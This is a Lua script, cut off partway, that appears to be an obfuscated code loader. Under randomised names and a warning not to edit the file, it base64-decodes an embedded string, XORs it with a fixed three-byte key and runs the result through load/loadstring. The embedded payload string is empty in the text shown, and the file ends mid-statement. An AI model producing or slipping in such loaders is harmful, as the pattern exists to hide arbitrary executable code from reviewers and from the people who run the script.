-- Do not edit this file. Any change breaks the decoder.
local _ytgugj = 100
local _sncpue = 42
local _vgjgps = 46
local _msrugq = ""

local _tkbtss = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

local function _yonqmh(a, b)
	local r, p = 0, 1
	for _ = 1, 8 do
		local x, y = a % 2, b % 2
		if x ~= y then r = r + p end
		a = (a - x) / 2; b = (b - y) / 2; p = p * 2
	end
	return r
end

local function _urtpps(d)
	d = d:gsub("[^" .. _tkbtss .. "=]", "")
	local o = {}
	local bits = (d:gsub("[%w%+/=]", function(c)
		if c == "=" then return "" end
		local f, s = (_tkbtss:find(c, 1, true) - 1), ""
		for i = 6, 1, -1 do
			s = s .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
		end
		return s
	end))
	local n = 0
	for i = 1, #bits - 7, 8 do
		local c = 0
		for j = 0, 7 do
			if bits:sub(i + j, i + j) == "1" then c = c + 2 ^ (7 - j) end
		end
		n = n + 1
		o[n] = string.char(c)
	end
	return table.concat(o)
end

local _rkadvd = _urtpps(_msrugq)
local _ctjreq = { _ytgugj, _sncpue, _vgjgps }
local _ulmqvw = {}
for i = 1, #_rkadvd do
	_ulmqvw[i] = string.char(_yonqmh(_rkadvd:byte(i), _ctjreq[(i - 1) % 3 + 1]))
end

local _fqjqhq = load or loadstring
local _fyvboh, _pfvijh = _fqjqhq(table.concat(_ulmqvw), "=w")
if not _fyvboh then
